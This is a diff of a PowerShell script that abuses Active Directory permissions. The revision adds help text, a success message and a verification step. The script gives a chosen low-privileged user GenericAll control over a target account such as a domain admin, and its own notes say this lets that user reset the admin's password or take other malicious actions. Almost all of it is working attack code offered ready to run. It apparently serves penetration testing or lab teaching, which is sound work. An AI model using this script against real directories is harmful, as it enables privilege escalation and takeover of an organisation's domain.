@@ -1,27 +1,45 @@
-#############################################
-#  ABUSE ACL TO ADD GENERICALL PERMISSION   #
-#############################################
-# Also known as: ACL Abuse / DACL Attack    #
-#############################################
-# Requires:
-# - Permissions to read and write ACLs on the target object (or write access to that object)
-# - Domain-joined machine
-# - ActiveDirectory module
-#
-# Grants "low.priv" user full control (GenericAll) over the "domainadmin" account.
-# This can be used to reset the admin's password or perform other malicious actions.
+<#
+.SYNOPSIS
+Abuses weak ACL permissions to grant a low-privileged user GenericAll rights over a target AD account.
+
+.DESCRIPTION
+This script demonstrates ACL/DACL abuse in Active Directory by adding a GenericAll 
+permission for a low-privileged user on a high-value target user (e.g., domain admin).
+Once granted, the low-privileged account can reset the target user's password or 
+perform other malicious actions.
+
+.REQUIREMENTS
+- Permissions to read and write ACLs on the target object (or write access to that object).
+- Domain-joined machine.
+- ActiveDirectory module (RSAT tools installed).
+
+.PARAMETER TargetUser
+The SamAccountName of the target user (e.g., "domainadmin").
+
+.PARAMETER LowPrivUser
+The SamAccountName of the low-privileged user to which GenericAll rights will be granted.
+
+.EXAMPLE
+PS> .\weak_perms_on_user.ps1 -TargetUser "domainadmin" -LowPrivUser "low.priv"
+Grants "low.priv" GenericAll permissions over "domainadmin".
+
+.NOTES
+Also known as: ACL Abuse / DACL Attack
+Author: Phoenix (example)
+#>
 
 param(
-    [Parameter(Mandatory=$true)]
-    [string]$TargetUser,
+	[Parameter(Mandatory=$true)]
+	[string]$TargetUser,
 
-    [Parameter(Mandatory=$true)]
-    [string]$LowPrivUser
+	[Parameter(Mandatory=$true)]
+	[string]$LowPrivUser
 )
 
-if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
-    Write-Error "ActiveDirectory module not found. Please install RSAT tools."
-    exit
+if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
+{
+	Write-Error "ActiveDirectory module not found. Please install RSAT tools."
+	exit
 }
 Import-Module ActiveDirectory
 
@@ -41,9 +59,9 @@ $ACL = $TargetDE.ObjectSecurity
 
 # Create new access rule with GenericAll
 $Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
-    $LowPrivSID,
-    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
-    [System.Security.AccessControl.AccessControlType]::Allow
+	$LowPrivSID,
+	[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
+	[System.Security.AccessControl.AccessControlType]::Allow
 )
 
 # Add and apply the rule
@@ -51,5 +69,9 @@ $ACL.AddAccessRule($Rule)
 $TargetDE.ObjectSecurity = $ACL
 $TargetDE.CommitChanges()
 
-# Usage:
-# .\weak_perms_on_user.ps1 -TargetUser "domainadmin" -LowPrivUser "low.priv"
+Write-Host "[+] Successfully granted GenericAll rights to $($LowPriv.SamAccountName) over $($Target.SamAccountName)" -ForegroundColor Green
+
+# Check if low-priv user is listed
+$ACL.Access | Where-Object {
+	$_.IdentityReference -like "*$LowPrivUser*" -and $_.ActiveDirectoryRights -match "GenericAll"
+}
